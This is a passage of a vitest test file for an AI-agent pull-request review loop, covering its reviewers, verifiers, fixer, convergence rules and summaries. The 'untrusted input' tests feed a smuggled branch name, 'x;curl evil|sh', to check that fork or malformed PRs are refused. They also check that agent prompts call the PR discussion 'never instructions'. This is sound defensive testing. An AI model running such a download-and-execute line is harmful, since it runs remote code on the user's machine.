// Runs .claude/workflows/review-loop-run.js against scripted agents: the script's control flow
// (what is posted, fixed, re-reported and summarized) is plain JavaScript and testable here.
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { installHooks } from '../agents.mjs';
import { nodeBin } from '../lib/bin.mjs';
import { commentBody, findingId, LOOP_PATHS } from '../pr-review.mjs';
import { commitAll, makeRepo, tempDir } from './helpers.mjs';

const REPO = resolve(import.meta.dirname, '../..');
const SOURCE = readFileSync(join(REPO, '.claude/workflows/review-loop-run.js'), 'utf8');
const AsyncFunction = Object.getPrototypeOf(async () => {}).constructor;
const SHA = 'a'.repeat(40);

/** The fixer pushed: the PR head moves to a new commit, which the fixer reports. */
const push = ({ state }) => {
  state.sha = (++state.pushes).toString(16).padStart(40, '0');
  return state.sha;
};

/** What `pr-review.mjs post` prints for the findings in a post prompt (one id per finding). */
const posted = ({ prompt }) => ({
  posted: [...prompt.matchAll(/"title": /g)].map((_, i) => `rl-${i}`),
  inline: 0,
});

const DEFAULTS = {
  head: ({ state }) => ({ sha: state.sha, branch: 'feature', crossRepository: false }),
  threads: () => ({ count: 0, threads: [] }),
  review: () => ({ findings: [] }),
  verify: () => ({ valid: true, reason: 'confirmed' }),
  post: posted,
  fix: (call) => ({ checkPassed: true, commit: push(call), resolutions: [] }),
  summary: () => 'commented',
  files: () => ({ files: ['tools/check.mjs'] }),
  disk: () => ({ freeGb: 100, inodeFreePct: 80 }),
  // a small fix: the next round is one fix checker (see BIG_FIX)
  fixStat: () => ({ files: 1, added: 12, addedNonTest: 10 }),
};
/** A fix over the budget: the next round is a follow-up review by all four reviewers. */
const BIG_FIX = () => ({ files: 9, added: 700, addedNonTest: 400 });

/** A clean hands-on run: what the tester reports unless a test answers for it (`tester`). */
const TESTED = [
  {
    claimOrArea: 'pnpm check --all',
    stepsOrCommand: 'pnpm check --all',
    result: 'pass',
    evidence: '✓ pnpm check passed',
  },
];

// Like the workflow runtime: a thunk that throws resolves to null.
const parallel = (thunks) => Promise.all(thunks.map((t) => t().catch(() => null)));

/**
 * Run the workflow; `responders[kind](call)` answers agent calls (kind = label prefix). The tester
 * is a reviewer (`review`), answered by `responders.tester` when a test gives one; otherwise its
 * `review` answer comes with a clean hands-on run (TESTED), since most tests are about findings.
 * The fix checker (`review:checker:…`) is answered by `responders.checker`, else like the tester.
 * A `state` call (`pr-review.mjs state`) is answered part by part, each part recorded as its own
 * call: `head`, `threads` (`threads:start` in round 1), `disk`, `files` (--files) and, with
 * --base, the fix size from `fixStat`. A `post --list` also gets its thread listing from `threads`.
 */
async function runLoop(responders = {}, args = { pr: 7, maxRounds: 3 }) {
  const calls = [];
  const state = { sha: SHA, pushes: 0 };
  const agent = async (prompt, opts = {}) => {
    const call = { kind: String(opts.label).split(':')[0], label: opts.label, prompt, opts, state };
    // Verifiers run in batches: answer each ITEM as its own `verify:<kind>:<path>:<title>` call, so
    // tests can script one verdict per finding and assert on per-finding labels (a null verdict is
    // left out of the batch). `verifyBatch` answers a whole batch instead.
    if (call.kind === 'verify' && opts.schema?.properties?.verdicts) {
      const items = JSON.parse(prompt.slice(prompt.indexOf('ITEMS (')).replace(/^[^\n]*\n/, ''));
      if (responders.verifyBatch) {
        calls.push(call);
        return responders.verifyBatch({ ...call, items });
      }
      const verdicts = [];
      for (const { kind, index, ...f } of items) {
        const itemCall = {
          ...call,
          label: `verify:${kind}:${f.path}:${f.title}`.slice(0, 80),
          prompt: `${prompt.slice(0, prompt.indexOf('ITEMS ('))}FINDING:\n${JSON.stringify(f, null, 2)}`,
          batchLabel: opts.label,
        };
        calls.push(itemCall);
        const verdict = await (responders.verify ?? DEFAULTS.verify)(itemCall);
        if (verdict) verdicts.push({ index, ...verdict });
      }
      return { verdicts };
    }
    calls.push(call);
    const answer = (kind, label) => {
      const sub = { ...call, kind, label, sub: true }; // a part of one call, not an agent
      if (label !== call.label) calls.push(sub);
      return (responders[kind] ?? DEFAULTS[kind])(sub);
    };
    if (call.kind === 'state') {
      const round = String(opts.label).split(':')[1];
      const out = {
        head: await answer('head', `head:${round}`),
        threads: await answer(
          'threads',
          round === 'r1' ? 'threads:start' : `threads:state:${round}`,
        ),
        disk: await answer('disk', `disk:${round}`),
      };
      if (prompt.includes('--files')) {
        const f = await answer('files', `files:${round}`);
        out.files = Array.isArray(f?.files)
          ? {
              count: f.files.length,
              loop: f.files.filter((x) => LOOP_PATHS.test(x)),
              error: f.error,
            }
          : f;
      }
      const base = prompt.match(/--base ([0-9a-f]{40})/)?.[1];
      if (base) out.fix = { base, ...(await answer('fixStat', `fixStat:${round}`)) };
      return out;
    }
    const handsOn = String(opts.label).match(/^review:(tester|checker):/)?.[1];
    const scripted =
      handsOn === 'checker'
        ? (responders.checker ?? responders.tester)
        : handsOn && responders.tester;
    const out = await (scripted ?? responders[call.kind] ?? DEFAULTS[call.kind])(call);
    if (call.kind === 'post' && prompt.includes('--list') && out && !out.error)
      return {
        ...out,
        threads: await answer('threads', `threads:post:${String(opts.label).split(':')[1]}`),
      };
    return handsOn && !scripted && Array.isArray(out?.findings) && !('tested' in out)
      ? { ...out, tested: TESTED }
      : out;
  };
  const body = SOURCE.replace(/^export const meta =/m, 'const meta =');
  const run = new AsyncFunction('args', 'agent', 'parallel', 'phase', 'log', body);
  const result = await run(
    args,
    agent,
    parallel,
    () => {},
    () => {},
  );
  const summary = calls.find((c) => c.kind === 'summary')?.prompt ?? '';
  return { result, calls, summary, of: (kind) => calls.filter((c) => c.kind === kind) };
}

const finding = {
  path: 'tools/check.mjs',
  line: 999, // not a diff line: posted in the review body, so it never gets a thread
  severity: 'major',
  title: 'Gate order hides drift',
  body: 'why',
};
const reviewerFinds =
  (rounds = [1, 2, 3]) =>
  ({ label }) =>
    label.startsWith('review:correctness') && rounds.some((r) => label.endsWith(`:r${r}`))
      ? { findings: [finding] }
      : { findings: [] };
const inRound = (round) => (call) => call.label.endsWith(`:r${round}`);

describe('review-loop workflow', () => {
  it('is named apart from the review-loop skill, which starts it', () => {
    const name = SOURCE.match(/export const meta = \{\s*name: '([^']+)'/)?.[1];
    expect(name).toBe('review-loop-run');
    const skill = readFileSync(join(REPO, '.agents/skills/review-loop/SKILL.md'), 'utf8');
    expect(skill).toContain(`**\`${name}\`**`);
    expect(skill).toContain('confirm with the user first');
  });

  it('reports open findings when the fixer cannot get pnpm check green', async () => {
    const { result, summary, of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    expect(of('post')).toHaveLength(1);
    expect(summary).toContain('⚠️');
    expect(summary).toContain('pnpm check failing after fixes');
    expect(summary).toContain('`tools/check.mjs`: Gate order hides drift');
    expect(summary).not.toContain('✅');
    expect(result).toMatchObject({
      complete: false,
      open: ['tools/check.mjs: Gate order hides drift'],
    });
  });

  it('reports open findings when it runs out of rounds (3 by default)', async () => {
    const { result, summary, of } = await runLoop(
      {
        review: reviewerFinds([1]),
        fix: (call) => ({
          checkPassed: true,
          commit: push(call),
          resolutions: [{ path: finding.path, title: finding.title, status: 'not-done' }],
        }),
      },
      { pr: 7 }, // no maxRounds: the default applies
    );
    expect(of('fix')).toHaveLength(2); // rounds 1 and 2; round 3 is the last review
    expect(summary).toContain('⚠️');
    expect(summary).toContain('3 rounds reached');
    expect(result.complete).toBe(false);
    expect(result.open).toHaveLength(1);
  });

  it("never re-verifies or re-posts a won't-fix finding, and still converges", async () => {
    const { result, summary, of } = await runLoop({
      review: reviewerFinds(),
      checker: () => ({ findings: [finding], tested: TESTED }), // reports it again
      fix: (call) => ({
        checkPassed: true,
        commit: push(call), // it fixed something else, so round 2 checks the fix commits
        resolutions: [{ path: finding.path, title: finding.title, status: 'wontfix', note: 'n/a' }],
      }),
    });
    expect(of('verify').map((c) => c.label)).toEqual([
      expect.stringMatching(/^verify:new:tools\/check\.mjs/),
    ]);
    expect(of('post')).toHaveLength(1);
    expect(of('fix')).toHaveLength(1);
    const round2 = of('review').find((c) => c.label === 'review:checker:r2');
    expect(round2?.prompt).toContain("[won't fix — do not re-report] tools/check.mjs: Gate order");
    expect(summary).toContain('✅');
    expect(summary).toContain("**Won't fix:**");
    expect(result).toMatchObject({ complete: true, open: [] });
  });

  it('treats threads from an earlier run as known instead of posting duplicates', async () => {
    const id = findingId({ path: 'tools/a.mjs', title: 'Old finding' });
    let fixed = false;
    const thread = () => ({
      id,
      title: 'Old finding',
      path: 'tools/a.mjs',
      line: 3,
      resolved: fixed,
      wontfix: false,
    });
    const { result, summary, of } = await runLoop({
      threads: () => ({ count: 1, threads: [thread()] }),
      review: ({ label }) =>
        label === 'review:tests:r1'
          ? { findings: [{ ...finding, path: 'tools/a.mjs', line: 3, title: 'Old finding' }] }
          : { findings: [] },
      fix: (call) => {
        fixed = true;
        // the rl- id that `pr-review.mjs resolve` takes, under the name `id` (never `threadId`,
        // which pr-review.mjs uses for GitHub's node id)
        expect(call.prompt).toContain(`"id": "${id}"`);
        expect(call.prompt).not.toContain('"threadId"');
        return {
          checkPassed: true,
          commit: push(call),
          resolutions: [{ path: 'tools/a.mjs', title: 'Old finding', status: 'fixed' }],
        };
      },
    });
    expect(of('review')[0]?.prompt).toContain('[open] tools/a.mjs: Old finding');
    expect(of('verify')).toHaveLength(0);
    expect(of('post')).toHaveLength(0);
    expect(of('fix')).toHaveLength(1);
    // the thread carries no severity: it counts as blocking, so its fix is checked in round 2
    expect(
      of('review')
        .filter(inRound(2))
        .map((c) => c.label),
    ).toEqual(['review:checker:r2']);
    expect(of('review').filter(inRound(2))[0]?.prompt).toContain(`"id": "${id}"`);
    expect(summary).toContain('✅');
    expect(result.complete).toBe(true);
    expect(commentBody({ ...finding, id }, 1)).toContain(id); // same id scheme as the threads
  });

  it('runs every code-reading agent in its own worktree at the PR head', async () => {
    const { of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    const codeAgents = [...of('review'), ...of('verify'), ...of('fix')];
    expect(codeAgents.length).toBe(6);
    for (const c of codeAgents) {
      expect(c.opts.isolation, c.label).toBe('worktree');
      expect(c.prompt, c.label).toContain(
        `  git fetch -q origin "pull/7/head"\n  git checkout -q --detach ${SHA}\n`,
      );
      expect(c.prompt, c.label).not.toMatch(/checkout --detach "origin\//);
      // the diff also for a PR too large for `gh pr diff` (HTTP 406)
      expect(c.prompt, c.label).toContain('node tools/pr-review.mjs diff --pr 7');
    }
    expect(of('fix')[0]?.prompt).toContain('git push origin HEAD:refs/heads/feature');
    expect(of('fix')[0]?.prompt).not.toContain('git switch');
  });

  it('re-posts a fixed finding that is STILL present, and fixes it again', async () => {
    const { result, summary, of } = await runLoop({
      review: reviewerFinds([1]),
      // the fix checker of round 2 still sees it; round 3's sees it gone
      checker: ({ label }) => ({
        findings: label.endsWith(':r2') ? [finding] : [],
        tested: TESTED,
      }),
      fix: (call) => ({
        checkPassed: true,
        commit: push(call),
        resolutions: [{ path: finding.path, title: finding.title, status: 'fixed' }],
      }),
    });
    expect(of('verify').map((c) => c.label)).toEqual([
      expect.stringMatching(/^verify:new:/),
      expect.stringMatching(/^verify:reopen:tools\/check\.mjs/),
    ]);
    expect(of('post').map((c) => c.label)).toEqual(['post:r1', 'post:r2']);
    expect(of('post')[1]?.prompt).toContain('STILL present');
    expect(of('post')[1]?.prompt).toContain('Gate order hides drift');
    expect(of('fix').map((c) => c.label)).toEqual(['fix:r1', 'fix:r2']);
    expect(of('fix')[1]?.prompt).toContain('Gate order hides drift');
    // round 3 checks only the second fix: round 2's checker already checked the first
    expect(of('review').find((c) => c.label === 'review:checker:r3')?.prompt).toContain(
      `pushed the commits ${'1'.padStart(40, '0')}..`,
    );
    expect(summary).toContain('✅');
    expect(result).toMatchObject({ complete: true, open: [] });
  });

  it('posts nothing when the verifier says a reported fixed finding is gone', async () => {
    const { result, of } = await runLoop({
      review: reviewerFinds([1]),
      checker: () => ({ findings: [finding], tested: TESTED }),
      verify: ({ label }) =>
        label.startsWith('verify:reopen')
          ? { valid: false, reason: 'the fix holds' }
          : { valid: true, reason: 'confirmed' },
      fix: (call) => ({
        checkPassed: true,
        commit: push(call),
        resolutions: [{ path: finding.path, title: finding.title, status: 'fixed' }],
      }),
    });
    expect(of('verify').map((c) => c.label)).toEqual([
      expect.stringMatching(/^verify:new:/),
      expect.stringMatching(/^verify:reopen:/),
    ]);
    expect(of('post').map((c) => c.label)).toEqual(['post:r1']);
    expect(of('fix')).toHaveLength(1);
    expect(result.complete).toBe(true);
  });

  it('refers the tester to what the repository can actually run', async () => {
    const { of } = await runLoop();
    const tester = of('review').find((c) => c.label === 'review:tester:r1');
    expect(tester?.prompt).toContain('pnpm check --all');
    expect(tester?.prompt).toContain('open the changed pages in a browser');
    // and has it report what it ran: at least one entry, each with its result and evidence
    expect(tester?.opts.schema.required).toEqual(['findings', 'tested']);
    expect(tester?.opts.schema.properties.tested).toMatchObject({
      minItems: 1,
      items: { required: ['claimOrArea', 'stepsOrCommand', 'result', 'evidence'] },
    });
    expect(tester?.prompt).toContain('"could-not-run"');
    expect(tester?.prompt).toContain('is "needs-human", not "could-not-run"');
    expect(tester?.prompt).not.toContain('when everything ran');
    const reviewer = of('review').find((c) => c.label === 'review:correctness:r1');
    expect(reviewer?.opts.schema.required).toEqual(['findings']);
    // (stack-only scripts such as the ports one are kept out by `pnpm agents:check`)
    expect(tester?.prompt).not.toMatch(/pnpm dev|playwright-cli|dev-ports/);
  });
});

describe('review-loop: an agent that returns nothing is never a clean answer', () => {
  it('does not post ✅ when every reviewer returns nothing', async () => {
    const { result, summary, of } = await runLoop({ review: () => null });
    expect(of('fix')).toHaveLength(0);
    expect(summary).not.toContain('✅');
    expect(summary).toContain('⚠️');
    expect(summary).toContain('gaps: reviewer correctness');
    expect(summary).toContain('| Open after round | Gaps |');
    expect(result.complete).toBe(false);
  });

  it('reviews the same head again when one reviewer failed, and converges once all answer', async () => {
    const { result, summary, of } = await runLoop({
      review: (call) =>
        call.label === 'review:tester:r1'
          ? Promise.reject(new Error('worktree setup failed'))
          : { findings: [] },
    });
    // round 2 runs again only the reviewer that gave no answer, at the same head
    expect(
      of('review')
        .filter(inRound(2))
        .map((c) => c.label),
    ).toEqual(['review:tester:r2']);
    expect(of('review').filter(inRound(2))[0]?.prompt).toContain(SHA);
    expect(result.rounds[1]?.kind).toBe('same head: tester');
    expect(of('fix')).toHaveLength(0);
    expect(summary).toContain('reviewer tester'); // round 1's gap is in the table
    expect(summary).toContain('✅');
    expect(result.complete).toBe(true);
  });

  it('keeps a finding whose verifier returned nothing unjudged, and verifies it again', async () => {
    let verifies = 0;
    const { result, of } = await runLoop({
      review: reviewerFinds([1, 2]),
      verify: () => (++verifies === 1 ? null : { valid: true, reason: 'confirmed' }),
      fix: (call) => ({
        checkPassed: true,
        commit: push(call),
        resolutions: [{ path: finding.path, title: finding.title, status: 'fixed' }],
      }),
    });
    expect(of('verify')).toHaveLength(2); // round 1: no verdict; round 2: confirmed
    expect(of('post').map((c) => c.label)).toEqual(['post:r2']);
    expect(of('fix')).toHaveLength(1);
    expect(result.complete).toBe(true);
  });

  it('stops with ⚠️ when the review threads cannot be listed or come back incomplete', async () => {
    for (const threads of [
      (call) => (call.label === 'threads:start' ? { count: 0, threads: [] } : null),
      (call) =>
        call.label === 'threads:start'
          ? { count: 0, threads: [] }
          : { count: 2, threads: [{ id: 'rl-1', resolved: false }] },
    ]) {
      const { result, summary } = await runLoop({ threads });
      expect(summary).toContain('could not list the review threads');
      expect(summary).not.toContain('✅');
      expect(result.complete).toBe(false);
    }
    await expect(runLoop({ threads: () => null })).rejects.toThrow('could not list');
  });

  it('counts fixes only once the fix commit is the PR head', async () => {
    const { result, summary, of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({
        checkPassed: true,
        commit: 'c'.repeat(40), // committed, but the push was refused: the head did not move
        resolutions: [{ path: finding.path, title: finding.title, status: 'fixed' }],
      }),
    });
    expect(of('review').filter(inRound(2))).toHaveLength(0);
    expect(summary).toContain('fix commit ccccccc is not the PR head aaaaaaa');
    expect(result).toMatchObject({
      complete: false,
      open: ['tools/check.mjs: Gate order hides drift'],
    });
  });
});

describe('review-loop: the hands-on tester shows what it ran', () => {
  it('does not post ✅ when the tester reports nothing it ran', async () => {
    for (const tester of [() => ({ findings: [] }), () => ({ findings: [], tested: [] })]) {
      const { result, summary, of } = await runLoop({ tester });
      // each round had a gap: the tester runs again at the same head, alone
      expect(
        of('review')
          .filter(inRound(3))
          .map((c) => c.label),
      ).toEqual(['review:tester:r3']);
      expect(of('fix')).toHaveLength(0);
      expect(summary).not.toContain('✅');
      expect(summary).toContain('⚠️');
      expect(summary).toContain('tester (reported nothing it ran)');
      expect(summary).toContain('- (the tester reported nothing it ran)');
      expect(result.complete).toBe(false);
    }
  });

  it('treats anything the tester could not run as a gap, and lists every test in the summary', async () => {
    const tested = [
      ...TESTED,
      {
        claimOrArea: 'the notes page',
        stepsOrCommand: 'open http://localhost:3000/notes',
        result: 'could-not-run',
        evidence: 'no browser tools in this session',
      },
    ];
    const { result, summary, of } = await runLoop({ tester: () => ({ findings: [], tested }) });
    expect(summary).toContain('tester could not run: the notes page');
    expect(summary).not.toContain('✅');
    // it would not run on the same head either: no second round of every reviewer
    expect(of('review')).toHaveLength(4);
    expect(summary).toContain("the tester's report would repeat at the same head");
    expect(summary).toContain('**Hands-on testing** (round 1, at aaaaaaa):');
    expect(summary).toContain(
      '- pass · pnpm check --all · `pnpm check --all` · ✓ pnpm check passed',
    );
    expect(summary).toContain(
      '- **could not run** · the notes page · `open http://localhost:3000/notes` · no browser tools',
    );
    expect(result).toMatchObject({ complete: false, tested: { round: 1, sha: SHA, tested } });
  });

  it('posts ✅ with the evidence once everything ran', async () => {
    const { result, summary } = await runLoop();
    expect(summary).toContain('✅');
    expect(summary).toContain('**Hands-on testing** (round 1, at aaaaaaa):');
    expect(summary).toContain('- pass · pnpm check --all');
    expect(result).toMatchObject({ complete: true, tested: { round: 1, tested: TESTED } });
  });

  it('says so in the summary when the tester never answered', async () => {
    const { summary } = await runLoop({ tester: () => null });
    expect(summary).toContain('**Hands-on testing:** the tester never answered.');
    expect(summary).toContain('reviewer tester');
    expect(summary).not.toContain('✅');
  });
});

describe('review-loop: duplicates are resolved once every verdict is in', () => {
  const a = { ...finding, title: 'Leak A (wrong framing)' };
  const b = { ...finding, title: 'Leak B (correct)', body: 'the real problem' };
  const twoReports = ({ label }) =>
    label === 'review:correctness:r1'
      ? { findings: [a] }
      : label === 'review:tests:r1'
        ? { findings: [b] }
        : { findings: [] };
  const verdicts =
    (forA) =>
    ({ label }) =>
      label.includes(a.title)
        ? forA
        : { valid: true, reason: 'confirmed', duplicateOf: 'Leak A (wrong framing)' };
  const fixAll = (call) => ({
    checkPassed: true,
    commit: push(call),
    resolutions: [a, b].map((f) => ({ path: f.path, title: f.title, status: 'fixed' })),
  });

  it('keeps a valid finding whose "original" was rejected', async () => {
    const { result, of } = await runLoop({
      review: twoReports,
      verify: verdicts({ valid: false, reason: 'not like that' }),
      fix: fixAll,
    });
    expect(of('post')).toHaveLength(1);
    expect(of('post')[0]?.prompt).toContain('Leak B (correct)');
    expect(of('post')[0]?.prompt).not.toContain('Leak A');
    expect(of('fix')[0]?.prompt).toContain('Leak B (correct)');
    expect(result.complete).toBe(true);
  });

  it('drops a duplicate of a finding confirmed in the same round', async () => {
    const { of } = await runLoop({
      review: twoReports,
      verify: verdicts({ valid: true, reason: 'confirmed' }),
      fix: (call) => ({
        checkPassed: true,
        commit: push(call),
        resolutions: [{ path: a.path, title: a.title, status: 'fixed' }],
      }),
    });
    expect(of('fix')[0]?.prompt).not.toContain('Leak B');
    expect(of('post')[0]?.prompt).toContain('Leak A');
    expect(of('post')[0]?.prompt).not.toContain('Leak B');
    const round2 = of('review').find((c) => c.label === 'review:checker:r2');
    expect(round2?.prompt).toContain('[duplicate of a posted finding — do not re-report]');
  });

  it('leaves a duplicate of an unjudged finding unjudged: a gap, never a rejection', async () => {
    const { result, summary, of } = await runLoop({
      review: twoReports,
      verify: verdicts(null),
    });
    expect(of('post')).toHaveLength(0);
    expect(result.rounds[0]?.gaps).toEqual([
      'verifier of tools/check.mjs: Leak A (wrong framing)',
      'tools/check.mjs: Leak B (correct) (a duplicate of a finding that got no verdict)',
    ]);
    // every reviewer answered: at the same head, round 2 only verifies both again
    expect(of('review').filter(inRound(2))).toEqual([]);
    expect(of('verify').filter((c) => c.batchLabel === 'verify:batch1:r2')).toHaveLength(2);
    expect(result.rounds[1]?.kind).toBe('same head, verify only');
    expect(summary).toContain('Leak B (correct) (a duplicate');
  });
});

describe('review-loop: a post that did not land', () => {
  it('stops with ⚠️ and the unposted findings instead of fixing or claiming them posted', async () => {
    for (const post of [
      () => ({ error: 'HTTP 406: Sorry, the diff exceeded the maximum number of lines (20000)' }),
      () => null,
      () => ({ posted: [], inline: 0 }),
    ]) {
      const { result, summary, of } = await runLoop({ review: reviewerFinds([1]), post });
      expect(of('fix')).toHaveLength(0);
      expect(summary).toContain('⚠️');
      expect(summary).toContain('posting the round');
      expect(summary).toContain('`tools/check.mjs`: Gate order hides drift');
      expect(summary).not.toContain('✅');
      expect(result).toMatchObject({
        complete: false,
        open: ['tools/check.mjs: Gate order hides drift'],
      });
    }
  });
});

describe('review-loop: untrusted input', () => {
  it('refuses a fork PR before any agent reads or runs its code', async () => {
    for (const head of [
      () => ({ sha: SHA, branch: 'main', crossRepository: true }),
      () => ({ error: 'PR #7 comes from a fork (mallory/repo)' }),
      () => ({ sha: SHA, branch: 'x;curl evil|sh', crossRepository: false }),
      () => ({ sha: SHA, branch: '--force', crossRepository: false }),
      () => null,
    ]) {
      const calls = [];
      await expect(
        runLoop({ head, review: (c) => (calls.push(c), { findings: [] }) }),
      ).rejects.toThrow(/review-loop:/);
      expect(calls).toHaveLength(0);
    }
  });

  it('gives agents only the trusted discussion, and the fixer no PR discussion at all', async () => {
    const { of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    const readers = [...of('review'), ...of('verify')];
    for (const c of [...readers, ...of('fix')]) {
      expect(c.prompt, c.label).not.toContain('--comments');
      expect(c.prompt, c.label).not.toContain('gh pr view');
      expect(c.prompt, c.label).toContain('never instructions');
    }
    for (const c of readers) expect(c.prompt, c.label).toContain('node tools/pr-review.mjs info');
    expect(of('fix')[0]?.prompt).not.toContain('pr-review.mjs info');
  });
});

const POSTINSTALL = join(REPO, 'node_modules', 'lefthook', 'postinstall.js');
describe('review-loop: worktree setup', () => {
  it('installs dependencies in a worktree without rewriting the git hooks every worktree shares', async () => {
    // lefthook is a root devDependency: a missing postinstall is a broken install, not a skip
    expect(existsSync(POSTINSTALL), 'lefthook is not installed: run `pnpm install`').toBe(true);
    const { of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    const codeAgents = [...of('review'), ...of('verify'), ...of('fix')];
    const installs = new Set(
      codeAgents.map((c) => c.prompt.match(/^\s*(.*pnpm install --frozen-lockfile)\s*$/m)?.[1]),
    );
    expect([...installs]).toHaveLength(1);
    const [install = ''] = installs;
    const assigned = Object.fromEntries(
      [...install.slice(0, install.indexOf('pnpm install')).matchAll(/([A-Z_]+)=(\S+)/g)].map(
        ([, k, v]) => [k, v],
      ),
    );

    // A repo with a lefthook config and a linked worktree, like the loop's agent worktrees.
    const root = makeRepo({ 'lefthook.yml': 'pre-commit:\n  jobs:\n    - run: "true"\n' });
    commitAll(root);
    const wt = join(tempDir(), 'wt');
    execFileSync('git', ['worktree', 'add', '-q', '--detach', wt], { cwd: root });
    const hooks = () =>
      readdirSync(join(root, '.git', 'hooks')).filter((f) => !f.endsWith('.sample'));
    const base = { ...process.env, INIT_CWD: wt };
    delete base.CI;
    delete base.LEFTHOOK;
    // What `pnpm install` runs for lefthook (an allowed build) in a fresh worktree:
    const postinstall = (env) =>
      spawnSync(process.execPath, [POSTINSTALL], { cwd: wt, env, encoding: 'utf8' });

    postinstall({ ...base, ...assigned });
    // ... and the root `prepare` script (tools/agents.mjs install-hooks)
    const lefthook = nodeBin(REPO, 'lefthook');
    expect(installHooks(wt, { env: { ...base, ...assigned }, lefthook })).toMatch(/^skipped/);
    expect(hooks()).toEqual([]);
    // Control: without that environment the same postinstall writes the shared hooks.
    const res = postinstall(base);
    expect(hooks(), `${res.stdout}${res.stderr}`).toContain('pre-commit');
    // The main checkout's hooks: pnpm re-runs `prepare` before a later `pnpm <script>` /
    // `pnpm exec` in the worktree without CI (verifyDepsBeforeRun), and it leaves them alone.
    expect(installHooks(root, { env: {}, lefthook })).toBe('installed');
    const hook = join(root, '.git', 'hooks', 'pre-commit');
    writeFileSync(hook, `${readFileSync(hook, 'utf8')}# main checkout\n`);
    expect(installHooks(wt, { env: base, lefthook })).toMatch(/^skipped \(linked worktree/);
    expect(readFileSync(hook, 'utf8')).toMatch(/# main checkout\n$/);
  }, 30_000);
});

describe('review-loop convergence rules', () => {
  const minor = { ...finding, severity: 'minor', title: 'Wording could be clearer' };
  const blocking = (title) => ({ ...finding, title });

  it('reviews the whole PR in round 1 and only the fix commits afterwards', async () => {
    const { of } = await runLoop({ review: reviewerFinds([1]), fixStat: BIG_FIX });
    const r1 = of('review').find((c) => c.label === 'review:correctness:r1');
    const r2 = of('review').find((c) => c.label === 'review:correctness:r2');
    expect(r1.prompt).not.toContain('FOLLOW-UP round');
    expect(r2.prompt).toContain('FOLLOW-UP round');
    expect(r2.prompt).toContain(`git diff ${SHA}..`);
  });

  it('never fixes minor/nit findings: posts them as suggestions for a human and ends ✅', async () => {
    const { result, summary, of } = await runLoop({
      review: ({ label }) =>
        label === 'review:correctness:r1' ? { findings: [minor] } : { findings: [] },
    });
    expect(of('post')).toHaveLength(1);
    expect(of('fix')).toHaveLength(0);
    expect(of('review').some((c) => c.label.endsWith(':r2'))).toBe(false);
    expect(summary).toContain('✅');
    expect(summary).toContain('1 suggestion(s) left for a human');
    expect(summary).toContain('Suggestions for a human');
    expect(summary).toContain(minor.title);
    expect(result.complete).toBe(true);
  });

  it('gives the fixer only blocking findings, never the minor ones next to them', async () => {
    const { of } = await runLoop({
      review: ({ label }) =>
        label === 'review:correctness:r1' ? { findings: [finding, minor] } : { findings: [] },
      fix: fixOpen,
    });
    expect(of('fix')).toHaveLength(1);
    expect(of('fix')[0].prompt).toContain(finding.title);
    expect(of('fix')[0].prompt).not.toContain(minor.title);
  });

  it('stops for a human when blocking findings do not decrease', async () => {
    const { result, summary, of } = await runLoop(
      {
        // every round a NEW blocking finding appears in the fixes
        review: ({ label }) =>
          label.startsWith('review:correctness')
            ? { findings: [blocking(`Regression introduced ${label.slice(-2)}`)] }
            : { findings: [] },
        fixStat: BIG_FIX,
        fix: (call) => ({ checkPassed: true, commit: push(call), resolutions: [] }),
      },
      { pr: 7, maxRounds: 6 },
    );
    // round 1 posts one and the fixer leaves it open; round 2 finds a new one in the fixes
    expect(summary).toContain('blocking findings not decreasing (1 → 2)');
    expect(result.complete).toBe(false);
    expect(of('review').filter((c) => c.label.startsWith('review:correctness'))).toHaveLength(2);
  });

  it('stops for a human when the fix of a blocking finding brings a new one (1 → 1)', async () => {
    const { result, summary, of } = await runLoop(
      {
        review: ({ label }) =>
          label === 'review:correctness:r1'
            ? { findings: [blocking('Bug A')] }
            : label === 'review:correctness:r2'
              ? { findings: [blocking('Bug B, from the fix of A')] }
              : { findings: [] },
        fixStat: BIG_FIX,
        fix: fixOpen,
      },
      { pr: 7, maxRounds: 6 },
    );
    expect(summary).toContain('blocking findings not decreasing (1 → 1)');
    expect(of('fix')).toHaveLength(1);
    expect(of('review').filter((c) => c.label.startsWith('review:correctness'))).toHaveLength(2);
    expect(result.complete).toBe(false);
  });

  it('never stops for "not decreasing" after a round with no blocking finding (0 → 1)', async () => {
    const { result, summary, of } = await runLoop({
      // round 1's reviewer died (a gap, 0 blocking); the retry finds a blocker
      review: ({ label }) =>
        label === 'review:correctness:r1'
          ? null
          : label === 'review:correctness:r2'
            ? { findings: [blocking('Found on the retry')] }
            : { findings: [] },
      fix: fixOpen,
    });
    expect(of('fix')).toHaveLength(1);
    expect(summary).not.toContain('not decreasing');
    expect(result.complete).toBe(true);
  });

  it('stops for a human when a fixed blocking finding is reopened a second time', async () => {
    const { result, summary, of } = await runLoop(
      { review: reviewerFinds([1, 2, 3, 4, 5]), fix: fixOpen, fixStat: BIG_FIX },
      { pr: 7, maxRounds: 5 },
    );
    // round 2 reopens it and it gets one more fix; round 3 reopens it again
    expect(of('fix')).toHaveLength(2);
    expect(of('review').filter((c) => c.label.startsWith('review:correctness'))).toHaveLength(3);
    expect(summary).toContain('reopened a second time: tools/check.mjs: Gate order hides drift');
    expect(result.complete).toBe(false);
  });

  it('never counts a reopen the verifier grades minor toward the second-reopen stop', async () => {
    const other = blocking('Another bug, never fixed');
    const { result, summary, of } = await runLoop({
      review: ({ label }) =>
        label === 'review:correctness:r1'
          ? { findings: [finding, other] }
          : label.startsWith('review:correctness')
            ? { findings: [finding] }
            : { findings: [] },
      // round 2 reopens it as major (one more fix attempt); round 3 as minor
      verify: ({ batchLabel }) => ({
        valid: true,
        reason: 'still there',
        likelihood: batchLabel.endsWith(':r3') ? 'unusual' : 'ordinary',
      }),
      fixStat: BIG_FIX,
      // fixes `finding` each time; `other` stays open, so the run goes on to round 3
      fix: (call) => ({
        checkPassed: true,
        commit: push(call),
        resolutions: [
          { path: finding.path, title: finding.title, status: 'fixed' },
          { path: other.path, title: other.title, status: 'not-done' },
        ],
      }),
